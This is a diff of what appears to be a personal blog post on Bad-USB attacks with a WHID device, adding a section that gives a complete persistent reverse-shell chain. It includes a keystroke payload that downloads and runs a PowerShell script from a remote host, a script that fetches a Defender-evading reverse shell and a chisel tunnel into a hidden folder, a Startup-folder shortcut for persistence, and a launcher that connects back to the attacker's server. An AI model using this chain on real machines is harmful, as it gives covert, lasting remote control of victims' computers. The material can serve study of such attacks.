@@ -15,7 +15,6 @@ title: Hacking with WHID
 ---
 
 ## Persistent reverse shell
-TODO encryption
 
 A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB of any kind, you can inject a payload to create a persistent reverse shell.
 
@@ -173,3 +172,46 @@ PrinteLine:C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Roaming\..\Lo
 This is simply the content of the shortcut.
 
 We end the script with `exit`, so the user does not see that something is up. Currently, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.
+
+## Revision
+
+So, I have been asked to give a short presentation on this subject, and I decided that I can go futher for this presentation. So, I looked into more parts of this in order to create a better payload.
+
+For this, I wanted a few things, first, a different shell. After some googling I found this one: [C-Reverse-Shell](https://github.com/dev-frog/C-Reverse-Shell). A reverse shell written in C++, undetected by windows defender, this removed a step from my payload and also removed the need for Administrator rights. The next step was to make the executing way quicker. This was achieved by downloading and executing the script and the background, so that no time is wasted on typing.This is the result:
+
+When the cactus is inserted, this payload is executed:
+
+```whid
+Press:131+114
+PrintLine:powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://192.168.241.1/script.ps1')"
+Press:176
+```
+
+A very simple, Windows + r, then a powershell command that downloads and executes a script, and does this all on the background. Then press enter. This is the executed script:
+
+```powershell
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/re.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/chisel.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\chisel.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/start.ps1", "$env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1")
+$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";$s.Arguments="-ExecutionPolicy Bypass $env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1";$s.Save();
+$path = Resolve-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Start-Process -FilePath $path -ArgumentList "-w hidden -ExecutionPolicy Bypass $env:APPDATA\..\Local\Microsoft\Windows\0\start.ps1"
+```
+
+The first three lines is downloading the files and placing then in my secret location. Then it makes a shortcut to execute on boot and last, it starts the payload:
+
+```powershell
+$path = Resolve-Path "$env:APPDATA\..\Local\Microsoft\Windows\0\chisel.exe"
+Start-Process -FilePath $path -ArgumentList "client 192.168.241.1:9002 8090" -WindowStyle Hidden
+
+Start-Sleep -s 2
+
+$path = Resolve-Path "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe"
+Start-Process -FilePath $path 
+```
+
+This starts the `chisel` client and connects to my server. Forwarding to local port 8090 to the attackers port 8090. Then it starts the reverse shell, which connects to `127.0.0.1:8090`, forwarded to the attackers machine.
+
+![shark](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/shark.png)
+
+Now, the downside of chisel is that it generates a lot more traffic, however, it is not just plain tcp traffic and it can be encrypted with SSL.
